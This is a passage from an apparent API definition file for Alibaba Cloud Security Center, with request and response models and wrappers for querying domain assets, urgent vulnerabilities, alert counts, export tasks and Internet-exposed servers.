  body: DescribeDomainCountResponseBody(name='body'),
}

async function describeDomainCount(request: DescribeDomainCountRequest): DescribeDomainCountResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeDomainCount', 'POST', '/', 'json', false, 'json', request);
}

model DescribeDomainDetailRequest {
  domainName: string(name='DomainName', description='The domain name or the name of website that you want to query.

>  Fuzzy match is not supported. You must enter a complete domain name or a website.', example='example.com', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.XX.XX', position='Query'),
}

model DescribeDomainDetailResponseBody = {
  alarmCount?: int32(name='AlarmCount', description='The total number of alerts in your website assets.', example='2'),
  domain?: string(name='Domain', description='The domain name.', example='example.com'),
  domainDetailItems?: [ 
    {
      assetType?: string(name='AssetType', description='The type of the domain asset. Valid values:

*   **0**: an Elastic Compute Service (ECS) instance
*   **1**: a Server Load Balancer (SLB) instance
*   **2**: a Network Address Translation (NAT) gateway
*   **3**: an ApsaraDB RDS instance
*   **4**: an ApsaraDB for MongoDB instance', example='0'),
      instanceId?: string(name='InstanceId', description='The instance ID of the asset.', example='i-m5e6w7dzsktt6mz4***'),
      instanceName?: string(name='InstanceName', description='The name of the asset.', example='iZm5e6w7dzsktt6mz4yimeZ-6****'),
      internetIp?: string(name='InternetIp', description='The public IP address of the asset.', example='1.2.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the asset.', example='1.2.XX.XX'),
      uuid?: string(name='Uuid', description='The instance UUID of the domain asset.', example='lb-bp1g9dohoyin9cjhn6****'),
    }
  ](name='DomainDetailItems', description='An array that consists of the details about the domain asset.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='3A85CFCF-05C8-451A-9E41-C0D5E96BA407'),
  rootDomain?: string(name='RootDomain', description='The name of the root domain that corresponds to the domain.', example='example.com'),
  vulCount?: int32(name='VulCount', description='The total number of vulnerabilities in your website assets.', example='2'),
}

model DescribeDomainDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeDomainDetailResponseBody(name='body'),
}

async function describeDomainDetail(request: DescribeDomainDetailRequest): DescribeDomainDetailResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeDomainDetail', 'POST', '/', 'json', false, 'json', request);
}

model DescribeDomainListRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1', position='Query'),
  domainType?: string(name='DomainType', description='The type of the domain name that you want to query. Valid values:

*   **root**: root domain name
*   **sub**: subdomain name', example='root', position='Query'),
  fuzzyDomain?: string(name='FuzzyDomain', description='The keyword that is used to query domain names. Fuzzy match is supported.', example='sas', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **10**.', example='10', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.122.XX.XX', position='Query'),
}

model DescribeDomainListResponseBody = {
  domainListResponseList?: [ 
    {
      domain?: string(name='Domain', description='The name of the domain or website.', example='example.com'),
      ipList?: string(name='IpList', description='The IP addresses of the domain name.', example='1.2.XX.XX,1.0.XX.XX'),
    }
  ](name='DomainListResponseList', description='An array that consists of the information about domain names.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='10'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='10'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **10**.', example='10'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='27'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='0B48AB3C-84FC-424D-A01D-B9270EF46038'),
}

model DescribeDomainListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeDomainListResponseBody(name='body'),
}

async function describeDomainList(request: DescribeDomainListRequest): DescribeDomainListResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeDomainList', 'POST', '/', 'json', false, 'json', request);
}

model DescribeEmgUserAgreementRequest {
}

model DescribeEmgUserAgreementResponseBody = {
  auth?: boolean(name='Auth', description='Indicates whether Security Center is authorized to scan for urgent vulnerabilities. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='768BB9F5-8AF3-557F-A489-9BDD64CB3E4C'),
}

model DescribeEmgUserAgreementResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeEmgUserAgreementResponseBody(name='body'),
}

async function describeEmgUserAgreement(request: DescribeEmgUserAgreementRequest): DescribeEmgUserAgreementResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeEmgUserAgreement', 'POST', '/', 'json', false, 'json', request);
}

model DescribeEmgVulItemRequest {
  checkType?: int32(name='CheckType', description='The check method. Valid values:

*   **0**: proof of concept (POC) verification
*   **1**: version comparison', example='0', position='Query'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **10**.', example='10', position='Query'),
  riskStatus?: string(name='RiskStatus', description='Specifies whether the vulnerability poses risks.\\
If you do not specify this parameter, all vulnerabilities are queried regardless of whether the vulnerabilities pose risks. Valid values:

*   **y**: yes
*   **n**: no', example='y', position='Query'),
  scanType?: string(name='ScanType', description='The method that is used to detect the vulnerability.\\
If you do not specify this parameter, all vulnerabilities are queried regardless of which method is used. Valid values:

*   **python**: The Version method is used. Security Center checks the software versions of your server to check whether disclosed vulnerabilities exist on your server.
*   **scan**: The Network Scan method is used. Security Center analyzes the access traffic to your server over the Internet to check whether vulnerabilities exist on your server.', example='python', position='Query'),
  vulName?: string(name='VulName', description='The name of the urgent vulnerability.', example='Changjietong T + SetupAccount/Upload.aspx file Upload vulnerability (CNVD-2022-60632)', position='Query'),
}

model DescribeEmgVulItemResponseBody = {
  currentPage?: int32(name='CurrentPage', description='The page number of the returned page. Pages start from page **1**. Default value: **1**.', example='1'),
  groupedVulItems?: [ 
    {
      aliasName?: string(name='AliasName', description='The name of the urgent vulnerability.', example='Changjietong T + SetupAccount/Upload.aspx file Upload vulnerability (CNVD-2022-60632)'),
      checkType?: int32(name='CheckType', description='The check method.', example='1'),
      gmtLastCheck?: long(name='GmtLastCheck', description='The timestamp when the urgent vulnerability was last detected. Unit: milliseconds.', example='1619286031000'),
      gmtPublish?: long(name='GmtPublish', description='The timestamp when the vulnerability was disclosed. Unit: milliseconds.', example='1618887687000'),
      name?: string(name='Name', description='The name of the detection rule.', example='scan:AVD-2021-179344'),
      pendingCount?: int32(name='PendingCount', description='The number of unhandled urgent vulnerabilities.', example='0'),
      progress?: int32(name='Progress', description='The progress of the urgent vulnerability detection task. Valid values: 0 to 100.

>  This parameter takes effect only when an urgent vulnerability is being detected.', example='50'),
      raspDefend?: int32(name='RaspDefend', description='Indicates whether the application protection feature is supported. Valid values:

*   **0**: no
*   **1**: yes

>  If this parameter is not returned, the application protection is not supported.', example='1'),
      status?: int32(name='Status', description='The detection status of the urgent vulnerability. Valid values:

*   **10**: The urgent vulnerability is not detected.
*   **20**: The urgent vulnerability is being detected.
*   **30**: The urgent vulnerability detection is complete.', example='30'),
      type?: string(name='Type', description='The method that is used to detect the urgent vulnerability. Valid values:

*   **python**: The Version method is used. Security Center checks the software versions of your server to check whether disclosed vulnerabilities exist on your server.
*   **scan**: The Network Scan method is used. Security Center analyzes the access traffic to your server over the Internet to check whether vulnerabilities exist on your server.', example='scan'),
    }
  ](name='GroupedVulItems', description='The information about the urgent vulnerabilities.'),
  pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **10**.', example='10'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='BC1868ED-A0E1-4D1C-BF7E-10DC0C34B3C3'),
  totalCount?: int32(name='TotalCount', description='The total number of the urgent vulnerabilities returned.', example='1'),
}

model DescribeEmgVulItemResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeEmgVulItemResponseBody(name='body'),
}

async function describeEmgVulItem(request: DescribeEmgVulItemRequest): DescribeEmgVulItemResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeEmgVulItem', 'POST', '/', 'json', false, 'json', request);
}

model DescribeEventLevelCountRequest {
  clusterId?: string(name='ClusterId', description='The ID of the container cluster.

> You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the IDs of container clusters.', example='c7e3c5b420a7947c2933303144688****', position='Query'),
  containerFieldName?: string(name='ContainerFieldName', description='The key of the condition that is used to query alert events on containers. Valid values:

*   **instanceId**: the ID of the asset
*   **appName**: the name of the application
*   **clusterId**: the ID of the cluster
*   **regionId**: the ID of the region
*   **nodeName**: the name of the node
*   **namespace**: the namespace
*   **clusterName**: the name of the cluster
*   **image**: the name of the image
*   **imageRepoName**: the name of the image repository
*   **imageRepoNamespace**: the namespace to which the image repository belongs
*   **imageRepoTag**: the tag that is added to the image
*   **imageDigest**: the digest of the image', example='clusterId', position='Query'),
  containerFieldValue?: string(name='ContainerFieldValue', description='The value of the condition that is used to query alert events on containers. If you specify multiple values, separate them with commas (,).', example='c951761046a9c4afe92be0a7b5bexxxxx', position='Query'),
  containerIds?: string(name='ContainerIds', description='The ID of the container.', example='xxxxxx30389a10c28f6d38f2398f0dcexxxxxxx922b9e8290dc7c3019d4a8,48b87f2c0662e334820f436cb9133f1ae4e053d39b6fad42xxxxxxxxxx', position='Query'),
  from?: string(name='From', description='The ID of the request source. Set the value to **sas**.', example='sas', position='Query'),
  targetType?: string(name='TargetType', description='The type of the query condition. Valid values:

*   **containerId**: the ID of the container
*   **uuid**: the UUID of the asset', example='uuid', position='Query'),
}

model DescribeEventLevelCountResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  eventLevels?: {
    remind?: int32(name='Remind', description='The number of alerts whose Emergency level is Reminder.', example='2'),
    serious?: int32(name='Serious', description='The number of alerts whose Emergency level is Urgent.', example='0'),
    suspicious?: int32(name='Suspicious', description='The number of alerts whose Emergency level is Suspicious.', example='1'),
  }(name='EventLevels', description='The statistics of alerts by risk level.'),
  message?: string(name='Message', description='The error message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='CE8CA5EA-24EF-5D41-B735-53ACE7XXXXX'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model DescribeEventLevelCountResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeEventLevelCountResponseBody(name='body'),
}

async function describeEventLevelCount(request: DescribeEventLevelCountRequest): DescribeEventLevelCountResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeEventLevelCount', 'POST', '/', 'json', false, 'json', request);
}

model DescribeEventOnStageRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
}

model DescribeEventOnStageResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='24A20733-10A0-4AF6-BE6B-E332241XXXXX'),
  securityEventStageResponse?: {
    securityEventOnStag?: map[string]any(name='SecurityEventOnStag', description='The platform that is supported by the feature of container threat detection. Valid values:

*   **container**
*   **linux**
*   **windows**'),
  }(name='SecurityEventStageResponse', description='The platforms that are supported by the feature of container threat detection.'),
}

model DescribeEventOnStageResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeEventOnStageResponseBody(name='body'),
}

async function describeEventOnStage(request: DescribeEventOnStageRequest): DescribeEventOnStageResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeEventOnStage', 'POST', '/', 'json', false, 'json', request);
}

model DescribeExcludeSystemPathRequest {
  currentPage: int32(name='CurrentPage', description='The number of the page to return. Default value: 1.', example='1', position='Query'),
  pageSize: int32(name='PageSize', description='The number of entries to return on each page.', example='20', maximum=200, position='Query'),
}

model DescribeExcludeSystemPathResponseBody = {
  excludePaths?: [ 
    {
      os?: string(name='Os', description='The operating system of the server. Valid values:

*   **linux**: Linux
*   **windows**: Windows', example='linux'),
      path?: string(name='Path', description='The absolute path to the directory.', example='/bin/'),
    }
  ](name='ExcludePaths', description='An array consisting of the directories that are excluded.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='20'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='55'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='FBBEB173-1F43-505F-A876-C03ECDF6****'),
}

model DescribeExcludeSystemPathResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeExcludeSystemPathResponseBody(name='body'),
}

async function describeExcludeSystemPath(request: DescribeExcludeSystemPathRequest): DescribeExcludeSystemPathResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeExcludeSystemPath', 'POST', '/', 'json', false, 'json', request);
}

model DescribeExportInfoRequest {
  exportId: long(name='ExportId', description='The ID of the export task.

> You can call the [ExportRecord](~~ExportRecord~~) operation to query the IDs of export tasks.', example='111', position='Query'),
}

model DescribeExportInfoResponseBody = {
  currentCount?: int32(name='CurrentCount', description='The number of exported entries.', example='20'),
  exportStatus?: string(name='ExportStatus', description='The status of the export task.

Valid values:

*   **init**: The task is being initialized.
*   **exporting**: The task is in progress.
*   **success**: The task is complete.', example='success'),
  fileName?: string(name='FileName', description='The name of the exported Excel file.', example='health_check_export_20171123'),
  id?: long(name='Id', description='The ID of the export task.', example='131231'),
  link?: string(name='Link', description='The URL at which you can download the exported Excel file.', example='http://www.aliyun.com'),
  message?: string(name='Message', description='The message that shows the task result. The value is fixed as **success**, which indicates that the task is complete.', example='success'),
  progress?: int32(name='Progress', description='The progress percentage of the export task.', example='16'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='CE500770-42D3-442E-9DDD-156E0F9F3B45'),
  totalCount?: int32(name='TotalCount', description='The total number of entries in the exported Excel file.', example='100'),
}

model DescribeExportInfoResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeExportInfoResponseBody(name='body'),
}

async function describeExportInfo(request: DescribeExportInfoRequest): DescribeExportInfoResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeExportInfo', 'POST', '/', 'json', false, 'json', request);
}

model DescribeExposedCheckWarningRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  typeName?: string(name='TypeName', description='The type of the baseline.

>  You can call the [DescribeRiskType](~~DescribeRiskType~~) operation to obtain the types of baselines from the response parameter **TypeName**.', example='weak_password', position='Query'),
  uuids?: string(name='Uuids', description='The UUID of the server. Separate multiple UUIDs with commas (,).

>  You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.', example='6541631a-7d47-41fd-9fef-9518113f****', position='Query'),
}

model DescribeExposedCheckWarningResponseBody = {
  count?: int32(name='Count', description='The total number of entries returned.', example='10'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='6D9CDB47-6191-4415-BE63-7E8B12CD****'),
  warningList?: [ 
    {
      riskId?: long(name='RiskId', description='The ID of the baseline.

>  You can call the [DescribeCheckWarningSummary](~~116179~~) operation to query the IDs of baselines.', example='107'),
      riskName?: string(name='RiskName', description='The name of the baseline.', example='Weak password-Redis DB login weak password baseline'),
      subTypeAlias?: string(name='SubTypeAlias', description='The display name of the baseline sub type.', example='Redis DB login weak password baseline'),
      typeAlias?: string(name='TypeAlias', description='The display name of the baseline type.', example='Weak password'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='1d35b031-ee4e-4e53-8b53-465ab712****'),
    }
  ](name='WarningList', description='An array that consists of the baseline risk items of the exposed server.'),
}

model DescribeExposedCheckWarningResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeExposedCheckWarningResponseBody(name='body'),
}

async function describeExposedCheckWarning(request: DescribeExposedCheckWarningRequest): DescribeExposedCheckWarningResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeExposedCheckWarning', 'POST', '/', 'json', false, 'json', request);
}

model DescribeExposedInstanceCriteriaRequest {
  value?: string(name='Value', description='The value of the search condition. Fuzzy match is supported.', example='id', position='Query'),
}

model DescribeExposedInstanceCriteriaResponseBody = {
  criteriaList?: [ 
    {
      name?: string(name='Name', description='The name of the search condition.', example='instanceId'),
      type?: string(name='Type', description='The type of the search condition. Valid values:

*   **input**: You must configure the search condition.
*   **select**: You must select a search condition from the **Values** list.', example='select'),
      values?: string(name='Values', description='The value of the search condition. This parameter is returned only when the value of the **Type** parameter is **select**.

>  If the value of the **Type** parameter is **input**, this parameter is empty.', example='i-bp19r0fdd39idxhf****'),
    }
  ](name='CriteriaList', description='The search conditions that are used to search for exposed assets.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='6D9CDB47-6191-4415-BE63-7E8B12CD4FBE'),
}

model DescribeExposedInstanceCriteriaResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeExposedInstanceCriteriaResponseBody(name='body'),
}

async function describeExposedInstanceCriteria(request: DescribeExposedInstanceCriteriaRequest): DescribeExposedInstanceCriteriaResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeExposedInstanceCriteria', 'POST', '/', 'json', false, 'json', request);
}

model DescribeExposedInstanceDetailRequest {
  uuid: string(name='Uuid', description='The UUID of the server that is exposed on the Internet.

> You can call the [DescribeExposedInstanceList](~~DescribeExposedInstanceList~~) operation to query the UUIDs of servers.', example='fc82b966-4d70-4e01-bf4f-aa4076a5****', position='Query'),
}

model DescribeExposedInstanceDetailResponseBody = {
  exposedChains?: [ 
    {
      allVulList?: [ 
        {
          aliasName?: string(name='AliasName', description='The alias of the vulnerability.', example='RHSA-2022:0274-Important: polkit pkexec Local Privilege Escalation Vulnerability(CVE-2021-4034)'),
          name?: string(name='Name', description='The name of the vulnerability.', example='SCA:ACSV-2020-052801'),
          necessity?: string(name='Necessity', description='The priority to fix the vulnerability. Valid values:

*   **asap**: high
*   **later**: medium
*   **nntf**: low

> We recommend that you fix the vulnerabilities that have the **high** priority at the earliest opportunity.', example='asap'),
          type?: string(name='Type', description='The type of the vulnerability. Valid values:

*   **cve**: Linux software vulnerability
*   **sys**: Windows system vulnerability
*   **cms**: Web-CMS vulnerability
*   **app**: application vulnerability
*   **emg**: urgent vulnerability
*   **sca**: middleware vulnerability', example='sca'),
          uuid?: string(name='Uuid', description='The UUID of the server.', example='4f9ce097-4a7d-48fe-baef-6960e5b6****'),
        }
      ](name='AllVulList', description='The details of all vulnerabilities on the server.'),
      exposureComponent?: string(name='ExposureComponent', description='The server component that is exposed on the Internet.', example='openssl,openssh'),
      exposureIp?: string(name='ExposureIp', description='The IP address that is exposed.', example='47.99.XX.XX'),
      exposurePort?: string(name='ExposurePort', description='The port that is exposed on the Internet.', example='22'),
      exposureType?: string(name='ExposureType', description='The resource from which the server is exposed. Valid values:

*   **INTERNET_IP**: the public IP address of an Elastic Compute Service (ECS) instance
*   **SLB**: the public IP address of a Server Load Balancer (SLB) instance
*   **EIP**: an elastic IP address (EIP)
*   **DNAT**: the NAT gateway that connects to the Internet by using the DNAT feature', example='INTERNET_IP'),
      exposureTypeId?: string(name='ExposureTypeId', description='The ID of the instance to which the resource belongs. The valid values of this parameter vary based on the ExposureType parameter.

*   If the value of the ExposureType parameter is **INTERNET_IP**, this parameter is empty.
*   If the value of the ExposureType parameter is **SLB**, the value of this parameter is the ID of the SLB instance.
*   If the value of the ExposureType parameter is **EIP**, the value of this parameter is the ID of the EIP.
*   If the value of the ExposureType parameter is **DNAT**, the value of this parameter is the ID of the NAT gateway.', example='eip-bp1bkgowzam49rld3****'),
      groupNo?: string(name='GroupNo', description='The server group to which the server belongs.', example='sg-bp1iw5enua6gf5i2xr7z'),
      instanceId?: string(name='InstanceId', description='The instance ID of the server.', example='i-bp116qem8npvchqc****'),
      instanceName?: string(name='InstanceName', description='The name of the server.', example='worker-k8s-for-cs-c929ee2a145214f89a8b248005be5****'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='47.99.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='192.168.XX.XX'),
      realVulList?: [ 
        {
          aliasName?: string(name='AliasName', description='The alias of the vulnerability.', example='RHSA-2022:0274-Important: polkit pkexec Local Privilege Escalation Vulnerability(CVE-2021-4034)'),
          name?: string(name='Name', description='The name of the vulnerability.', example='SCA:ACSV-2020-052801'),
          necessity?: string(name='Necessity', description='The priority to fix the vulnerability. Valid values:

*   **asap**: high
*   **later**: medium
*   **nntf**: low

> We recommend that you fix the vulnerabilities that have the **high** priority at the earliest opportunity.', example='asap'),
          type?: string(name='Type', description='The type of the vulnerability. Valid values:

*   **cve**: Linux software vulnerability
*   **sys**: Windows system vulnerability
*   **cms**: Web-CMS vulnerability
*   **app**: application vulnerability
*   **emg**: urgent vulnerability
*   **sca**: middleware vulnerability', example='sca'),
          uuid?: string(name='Uuid', description='The UUID of the server.', example='4f9ce097-4a7d-48fe-baef-6960e5b6****'),
        }
      ](name='RealVulList', description='The information about the vulnerabilities that are exposed on the Internet and can be exploited by attackers.'),
      regionId?: string(name='RegionId', description='The region in which the server resides.

> For more information about the mapping between region IDs and region names, see [Regions and zones](~~40654~~).', example='cn-hangzhou'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='4f9ce097-4a7d-48fe-baef-6960e5b6****'),
    }
  ](name='ExposedChains', description='The list of exposure details of the server.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='C590482B-54A7-4273-8115-9DBE2DE46B26'),
}

model DescribeExposedInstanceDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeExposedInstanceDetailResponseBody(name='body'),
}

async function describeExposedInstanceDetail(request: DescribeExposedInstanceDetailRequest): DescribeExposedInstanceDetailResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeExposedInstanceDetail', 'POST', '/', 'json', false, 'json', request);
}

model DescribeExposedInstanceListRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='1', position='Query'),
  exposureComponent?: string(name='ExposureComponent', description='The server component that is exposed on the Internet.', example='openssl', position='Query'),
  exposureIp?: string(name='ExposureIp', description='The public IP address of the server.', example='116.12.XX.XX', position='Query'),
  exposurePort?: string(name='ExposurePort', description='The port that is exposed on the Internet.', example='22', position='Query'),
  groupId?: long(name='GroupId', description='The ID of the server group.

> You can call the [DescribeAllGroups](~~DescribeAllGroups~~) operation to query the IDs of server groups.', example='9535356', position='Query'),
  healthStatus?: boolean(name='HealthStatus', description='The health status of the Elastic Compute Service (ECS) instance in the scaling group. ECS instances that are not in the Running state are considered unhealthy. Valid values:

*   Healthy
*   Unhealthy

Auto Scaling automatically removes unhealthy ECS instances from the scaling group and then releases the automatically created instances among the unhealthy instances.

Unhealthy ECS instances that are manually added to the scaling group are released based on the management mode of the instance lifecycle. If the lifecycle of the ECS instances is not managed by the scaling group, Auto Scaling removes the instances from the scaling group but does not release them. If the lifecycle of the ECS instances is managed by the scaling group, Auto Scaling removes the instances from the scaling group and releases them.

>  Make sure that you have sufficient balance within your account. If you have overdue payments in your account, pay-as-you-go and preemptible instances are stopped or released. For information about how the status of ECS instances changes when you have overdue payments in your account, see [Overdue payments](~~170589~~).', example='Unhealthy', position='Query'),
  instanceId?: string(name='InstanceId', description='The ID of the server.', example='i-bp1g6wxdwps7s9dz****', position='Query'),
  instanceName?: string(name='InstanceName', description='The name of the server.', example='abc_centos7.2_005', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

>  We recommend that you do not leave this parameter empty.', example='20', position='Query'),
  vulStatus?: boolean(name='VulStatus', description='Specifies whether the server has vulnerabilities. Valid values:

*   **true**: The server has vulnerabilities.
*   **false**: The server does not have vulnerabilities.', example='true', position='Query'),
}

model DescribeExposedInstanceListResponseBody = {
  exposedInstances?: [ 
    {
      asapVulCount?: int32(name='AsapVulCount', description='The number of high-severity vulnerabilities that are exposed on the Internet and can be exploited by attackers.', example='0'),
      exploitHealthCount?: int32(name='ExploitHealthCount', description='The total number of servers that are exposed on the Internet.', example='0'),
      exposureComponent?: string(name='ExposureComponent', description='The server component that is exposed on the Internet.', example='openssl,openssh'),
      exposureIp?: string(name='ExposureIp', description='The public IP address that is exposed on the Internet.', example='116.12.XX.XX'),
      exposurePort?: string(name='ExposurePort', description='The port that is exposed on the Internet.', example='22'),
      exposureType?: string(name='ExposureType', description='The resource from which the asset is exposed. Valid values:

*   **INTERNET_IP**: the public IP address of an ECS instance
*   **SLB**: the public IP address of a Server Load Balancer (SLB) instance
*   **EIP**: an elastic IP address (EIP)
*   **DNAT**: the NAT gateway that connects to the Internet by using the DNAT feature', example='INTERNET_IP'),
      exposureTypeId?: string(name='ExposureTypeId', description='The ID of the instance to which the resource belongs. The valid values of this parameter vary based on the ExposureType parameter.

*   If the value of the ExposureType parameter is **INTERNET_IP**, this parameter is empty.
*   If the value of the ExposureType parameter is **SLB**, the value of this parameter is the ID of the SLB instance.
*   If the value of the ExposureType parameter is **EIP**, the value of this parameter is the ID of the EIP.
*   If the value of the ExposureType parameter is **DNAT**, the value of this parameter is the ID of the NAT gateway.', example='i-ew11313a****'),
      groupId?: long(name='GroupId', description='The ID of the server group.', example='9469268'),
      groupName?: string(name='GroupName', description='The name of the server group.', example='testGroup'),
      instanceId?: string(name='InstanceId', description='The ID of the server.', example='i-bp1g6wxdwps7s9dz****'),
      instanceName?: string(name='InstanceName', description='The name of the server.', example='abc_centos7.2_005'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='116.12.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='192.168.XX.XX'),
      laterVulCount?: int32(name='LaterVulCount', description='The number of medium-severity vulnerabilities that are exposed on the Internet and can be exploited by attackers.', example='0'),
      nntfVulCount?: int32(name='NntfVulCount', description='The number of low-severity vulnerabilities that are exposed on the Internet and can be exploited by attackers.', example='0'),
      regionId?: string(name='RegionId', description='The ID of the region where the server resides.

>  For more information about the mapping between region IDs and region names, see [Regions and zones](~~40654~~).', example='cn-hangzhou'),
      totalVulCount?: int32(name='TotalVulCount', description='The total number of vulnerabilities that are exposed on the Internet and can be exploited by attackers.', example='0'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='dd803d9e-a337-4add-9c5b-7d503e08****'),
    }
  ](name='ExposedInstances', description='An array that consists of the details about the exposed asset.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='2'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries about the servers that are exposed on the Internet.', example='2'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='598A4A61-ABA7-456B-8725-7378258276D9'),
}

model DescribeExposedInstanceListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeExposedInstanceListResponseBody(name='body'),
}

async function describeExposedInstanceList(request: DescribeExposedInstanceListRequest): DescribeExposedInstanceListResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeExposedInstanceList', 'POST', '/', 'json', false, 'json', request);
}

model DescribeExposedStatisticsRequest {
}

model DescribeExposedStatisticsResponseBody = {
  exposedAsapVulCount?: int32(name='ExposedAsapVulCount', description='The total number of high-risk vulnerabilities that are exposed on the Internet and can be exploited by attackers.', example='1'),
  exposedComponentCount?: int32(name='ExposedComponentCount', description='The total number of system components that are exposed on the Internet. The components include OpenSSL and OpenSSH.', example='7'),
  exposedInstanceCount?: int32(name='ExposedInstanceCount', description='The total number of servers that are exposed on the Internet.', example='100'),
  exposedIpCount?: int32(name='ExposedIpCount', description='The total number of IP addresses that are exposed on the Internet.', example='100'),
  exposedLaterVulCount?: int32(name='ExposedLaterVulCount', description='The total number of medium-risk vulnerabilities that are exposed on the Internet and can be exploited by attackers.', example='5'),
  exposedNntfVulCount?: int32(name='ExposedNntfVulCount', description='The total number of low-risk vulnerabilities that are exposed on the Internet and can be exploited by attackers.', example='0'),
  exposedPortCount?: int32(name='ExposedPortCount', description='The total number of ports that are exposed on the Internet.', example='6'),
  exposedWeekPasswordMachineCount?: int32(name='ExposedWeekPasswordMachineCount', description='The total number of system keys that are detected on your servers and are exposed on the Internet.', example='20'),
